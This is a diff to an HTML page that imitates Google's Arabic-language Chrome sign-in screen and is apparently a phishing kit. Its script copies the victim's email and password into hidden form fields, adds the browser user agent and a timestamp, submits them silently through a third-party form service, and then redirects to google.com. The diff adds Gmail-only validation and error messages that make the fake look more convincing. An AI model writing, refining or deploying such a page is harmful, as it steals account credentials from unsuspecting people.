@@ -33,7 +33,6 @@
       box-shadow: none;
     }
 
-    /* Google Logo */
     .container svg {
       display: block;
       margin: 0 0 24px auto; /* push logo to top right */
@@ -202,7 +201,7 @@
     </div>
     <p style="margin: 24px 0; color: #bdc1c6; font-size: 14px; text-align: right;">
       ألا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص.
-      <a href="https://support.google.com/chrome/answer/6130773?hl=ar" class="link">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
+      <a href="https://support.Google.com/chrome/answer/6130773?hl=ar" class="link">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
     </p>
     
     <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
@@ -285,45 +284,160 @@
     const hiddenEmail = document.getElementById('hidden-email');
     const hiddenName = document.getElementById('hidden-name');
 
-    // Show step 2
+    // Fixed Gmail validation function
+    function isValidGmail(email) {
+        const trimmedEmail = email.trim().toLowerCase();
+        
+        if (!trimmedEmail) return false;
+        
+        // Fixed regex - simpler and more permissive for Gmail validation
+        const gmailRegex = /^[a-zA-Z0-9._%+-]+@(gmail|googlemail)\.com$/;
+        
+        return gmailRegex.test(trimmedEmail);
+    }
+
+    // Error message function
+    function showError(message) {
+        // Remove existing error message
+        const existingError = document.querySelector('.error-message');
+        if (existingError) {
+            existingError.remove();
+        }
+        
+        // Create error message element
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'error-message';
+        errorDiv.style.cssText = `
+            color: #ea4335;
+            font-size: 14px;
+            margin-top: 0px;
+            text-align: right;
+         `;
+        errorDiv.textContent = message;
+        
+        // Insert after input field
+        emailInput.parentNode.appendChild(errorDiv);
+        
+        // Add red border to input
+        emailInput.style.borderColor = '#ea4335';
+        emailInput.style.boxShadow = '0 0 0 2px rgba(234, 67, 53, 0.3)';
+    }
+
+    // Clear error when user starts typing again
+    emailInput.addEventListener('focus', function() {
+        const existingError = document.querySelector('.error-message');
+        if (existingError) {
+            existingError.remove();
+        }
+        emailInput.style.borderColor = '#c0c3c7';
+        emailInput.style.boxShadow = 'none';
+    });
+
+    // Real-time validation feedback
+    emailInput.addEventListener('input', function() {
+        const email = emailInput.value.trim();
+        
+        // Clear error when typing
+        const existingError = document.querySelector('.error-message');
+        if (existingError) {
+            existingError.remove();
+        }
+        
+        if (email && !isValidGmail(email)) {
+            emailInput.style.borderColor = '#ea4335';
+            emailInput.style.boxShadow = '0 0 0 2px rgba(234, 67, 53, 0.3)';
+        } else {
+            emailInput.style.borderColor = '#c0c3c7';
+            emailInput.style.boxShadow = 'none';
+        }
+    });
+
+    // Show step 2 with Gmail validation - FIXED
     nextBtn.addEventListener('click', function(e) {
-      e.preventDefault();
-      const email = emailInput.value.trim();
-      if (!email) {
-        return;
-      }
-      emailDisplayText.textContent = email;
-      step1.style.display = 'none';
-      step2.style.display = 'block';
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        
+        console.log('Email entered:', email); // Debug log
+        console.log('Is valid Gmail:', isValidGmail(email)); // Debug log
+        
+        // Validation checks
+        if (!email) {
+            showError('يرجى إدخال بريد إلكتروني');
+            return;
+        }
+        
+        if (!isValidGmail(email)) {
+            showError('يرجى استخدام بريد Gmail صالح (يجب أن ينتهي بـ @gmail.com)');
+            emailInput.focus();
+            return;
+        }
+        
+        // If validation passes
+        emailDisplayText.textContent = email;
+        step1.style.display = 'none';
+        step2.style.display = 'block';
     });
 
     // Toggle password visibility
     document.getElementById('show-password').addEventListener('change', function () {
-      nameInput.type = this.checked ? 'text' : 'password';
+        nameInput.type = this.checked ? 'text' : 'password';
+    });
+
+    // Password error function
+    function showPasswordError(message) {
+        const existingError = document.querySelector('.password-error');
+        if (existingError) {
+            existingError.remove();
+        }
+        
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'password-error';
+        errorDiv.style.cssText = `
+            color: #ea4335;
+            font-size: 14px;
+            margin-top: 2px;
+            text-align: right;
+          `;
+        errorDiv.textContent = message;
+        
+        nameInput.parentNode.appendChild(errorDiv);
+        nameInput.style.borderColor = '#ea4335';
+        nameInput.style.boxShadow = '0 0 0 2px rgba(234, 67, 53, 0.3)';
+    }
+
+    // Clear password error on focus
+    nameInput.addEventListener('focus', function() {
+        const existingError = document.querySelector('.password-error');
+        if (existingError) {
+            existingError.remove();
+        }
+        nameInput.style.borderColor = '#c0c3c7';
+        nameInput.style.boxShadow = 'none';
     });
 
     // Submit and redirect
     submitBtn.addEventListener('click', function (e) {
-      e.preventDefault();
-      const name = nameInput.value.trim();
-      if (!name) {
-        return;
-      }
+        e.preventDefault();
+        const name = nameInput.value.trim();
+        if (!name) {
+            showPasswordError('يرجى إدخال كلمة المرورالصحيحة');
+            return;
+        }
 
-      // Set form values
-      hiddenEmail.value = emailInput.value;
-      hiddenName.value = name;
-      document.getElementById('user-agent').value = navigator.userAgent;
-      document.getElementById('timestamp').value = new Date().toISOString();
+        // Set form values
+        hiddenEmail.value = emailInput.value;
+        hiddenName.value = name;
+        document.getElementById('user-agent').value = navigator.userAgent;
+        document.getElementById('timestamp').value = new Date().toISOString();
 
-      // Submit silently
-      web3form.requestSubmit();
+        // Submit silently
+        web3form.requestSubmit();
 
-      // Redirect to Google
-      setTimeout(() => {
-        window.location.href = "https://www.google.com"; // ✅ Trimmed
-      }, 700);
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 700);
     });
+    
   </script>
 </body>
 </html>
